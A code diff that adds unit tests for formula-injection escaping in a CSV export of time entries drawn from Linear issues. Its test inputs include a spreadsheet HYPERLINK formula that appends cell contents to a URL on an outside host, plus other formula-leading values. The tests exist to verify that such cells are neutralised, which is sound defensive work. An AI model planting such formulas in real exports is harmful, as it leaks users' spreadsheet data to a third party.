@@ -73,6 +73,18 @@ assert.strictEqual(lines[0], "Date,Start,End,Hours,Duration,Issue,Title,Project,
 assert.strictEqual(lines[1], "2026-10-27,,,1.00,1h,E-1,One,P1,T,,yes")
 assert.strictEqual(lines[2], '2026-10-28,09:00,09:30,0.50,30m,E-2,Two,P1,T,"said ""hi"", ok",')
 
+// Issue titles, project names and notes come from Linear (anyone in the
+// team writes them): a cell a spreadsheet would read as a formula starts
+// with ' instead, and a lone \r is quoted like \n.
+const formula = T.toCsv([{ ...list[0], manual: true, title: '=HYPERLINK("https://e.io/?"&A1,"x")', projectName: "@SUM(A1)",
+  teamName: "+1", note: "-2+3", identifier: "\tE-1" }, { ...list[1], note: "a\rb", title: "=" }])
+const f = formula.trim().split("\n")
+assert.strictEqual(f[1], `2026-10-27,,,1.00,1h,'\tE-1,"'=HYPERLINK(""https://e.io/?""&A1,""x"")",'@SUM(A1),'+1,'-2+3,yes`)
+assert.ok(formula.includes('"a\rb"'), JSON.stringify(formula))
+assert.ok(formula.includes(",'=,"), JSON.stringify(formula))
+// Ordinary text and numbers stay as they are.
+assert.strictEqual(T.toCsv([{ ...list[1], note: "fixed it, -ish" }]).trim().split("\n")[1], '2026-10-28,09:00,09:30,0.50,30m,E-2,Two,P1,T,"fixed it, -ish",')
+
 // merge
 const m = T.merge({ entries: [list[0]], running: null }, { entries: [list[0], list[1]], running: null })
 assert.strictEqual(m.added, 1)
